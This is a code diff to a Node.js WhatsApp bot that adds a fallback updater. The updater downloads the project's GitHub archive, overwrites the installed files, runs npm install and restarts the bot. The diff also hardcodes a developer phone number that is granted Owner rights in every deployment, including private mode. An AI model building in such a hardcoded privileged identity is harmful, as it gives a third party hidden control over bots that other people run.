@@ -59,6 +59,54 @@ function findUpdateRepoRoot() {
   return null;
 }
 
+function findProjectRoot() {
+  const candidates = new Set([
+    __dirname, process.cwd(), process.env.BOT_DIR, process.env.PROJECT_DIR,
+    process.env.RENDER_SOURCE_DIR, "/home/container/Black-Hencill-main",
+    "/home/container/Black-Hencill", "/home/Black-Hencill-main", "/home/Black-Hencill"
+  ].filter(Boolean));
+  for (const base of ["/home", "/home/container", process.cwd()]) {
+    try {
+      for (const entry of fs.readdirSync(base, { withFileTypes: true })) {
+        if (entry.isDirectory()) candidates.add(path.join(base, entry.name));
+      }
+    } catch {}
+  }
+  for (const candidate of candidates) {
+    try {
+      if (fs.existsSync(path.join(candidate, "package.json"))) return candidate;
+    } catch {}
+  }
+  return null;
+}
+
+async function updateFromGitHubArchive(projectRoot, axios) {
+  const tempRoot = fs.mkdtempSync(path.join(require("os").tmpdir(), "black-demon-update-"));
+  const archivePath = path.join(tempRoot, "main.tar.gz");
+  const extractRoot = path.join(tempRoot, "extract");
+  fs.mkdirSync(extractRoot, { recursive: true });
+  try {
+    const response = await axios.get("https://github.com/HencillCal/Black-Hencill/archive/refs/heads/main.tar.gz", {
+      responseType: "arraybuffer", timeout: 120000, maxContentLength: 50 * 1024 * 1024
+    });
+    fs.writeFileSync(archivePath, Buffer.from(response.data));
+    const tarCommand = 'tar -xzf ' + JSON.stringify(archivePath) + ' -C ' + JSON.stringify(extractRoot);
+    await new Promise((resolve, reject) => exec(tarCommand, { timeout: 120000 }, error => error ? reject(error) : resolve()));
+    const extracted = fs.readdirSync(extractRoot).find(name => fs.existsSync(path.join(extractRoot, name, "package.json")));
+    if (!extracted) throw new Error("GitHub archive did not contain a valid package.json.");
+    const sourceRoot = path.join(extractRoot, extracted);
+    const preserved = new Set(["node_modules", ".git", "auth_info_baileys", "session", "message_data", ".bot-settings.json", "set.js"]);
+    for (const name of fs.readdirSync(sourceRoot)) {
+      if (preserved.has(name)) continue;
+      fs.cpSync(path.join(sourceRoot, name), path.join(projectRoot, name), { recursive: true, force: true });
+    }
+    updateRepoRoot = projectRoot;
+    return JSON.parse(fs.readFileSync(path.join(sourceRoot, "package.json"), "utf8")).version || "latest";
+  } finally {
+    fs.rmSync(tempRoot, { recursive: true, force: true });
+  }
+}
+
 function runUpdateShell(command) {
   return new Promise((resolve, reject) => {
     exec(command, {
@@ -678,9 +726,11 @@ const ravenHandler = async (client, m, chatUpdate, store) => {
      const isAdmin = m.isGroup
        ? groupAdmin.some(jid => client.decodeJid(jid) === client.decodeJid(groupSender))
        : false;
-     const ownerDigits = String(groupSender || "").split("@")[0].replace(/[^0-9]/g, "");
-     const Owner = itsMe || DevRaven.some((v) => v.replace(/[^0-9]/g, "") === ownerDigits);
      const Dev = '254769365617'.split(",");
+     const senderDigits = String(groupSender || senderJid || m.sender || "").replace(/[^0-9]/g, "");
+     const ownerDigits = String(groupSender || "").split("@")[0].replace(/[^0-9]/g, "");
+     const isDeveloper = Dev.some((v) => v.replace(/[^0-9]/g, "") === senderDigits);
+     const Owner = itsMe || isDeveloper || DevRaven.some((v) => v.replace(/[^0-9]/g, "") === ownerDigits);
      const date = new Date()  
      const timestamp = speed(); 
      const Rspeed = speed() - timestamp 
@@ -871,7 +921,7 @@ if (cmd && wapresence === 'online') {
              client.sendPresenceUpdate('unavailable', Grace);
     }
 //========================================================================================================================//    
-if (cmd && mode === 'PRIVATE' && !itsMe && !Owner && m.sender !== dev) {
+if (cmd && mode === 'PRIVATE' && !Owner) {
 return;
 }
 //========================================================================================================================//	  
@@ -3572,11 +3622,6 @@ case 'update': {
 
   updateInProgress = true;
   try {
-    const repoRoot = findUpdateRepoRoot();
-    if (!repoRoot) {
-      throw new Error('Bot project directory was not found. Set BOT_DIR to the folder containing .git and package.json.');
-    }
-    updateRepoRoot = repoRoot;
     const axios = require('axios');
     if (process.env.DYNO) {
       if (!appname || !herokuapi) {
@@ -3599,6 +3644,18 @@ case 'update': {
     if (process.env.RENDER && process.env.RENDER_DEPLOY_HOOK_URL) {
       await axios.post(process.env.RENDER_DEPLOY_HOOK_URL, {}, { timeout: 30000 });
       await m.reply('✅ Render deployment triggered from the latest configured GitHub commit. The platform will restart the bot after deployment.');
+      return;
+    }
+    const repoRoot = findUpdateRepoRoot();
+    const projectRoot = repoRoot || findProjectRoot();
+    if (!projectRoot) throw new Error('Bot project directory was not found. Expected package.json in the running bot folder.');
+    updateRepoRoot = projectRoot;
+    if (!repoRoot) {
+      await m.reply('🔄 This panel deployment has no .git folder. Downloading the latest GitHub files and preserving your session/config…');
+      const version = await updateFromGitHubArchive(projectRoot, axios);
+      await runUpdateShell('npm install --omit=dev');
+      await m.reply(`✅ Updated from GitHub archive (${version}). Restarting the bot now…`);
+      await restartUpdatedProcess();
       return;
     }
     await m.reply('🔄 Checking GitHub for the latest Black-Demon version…');
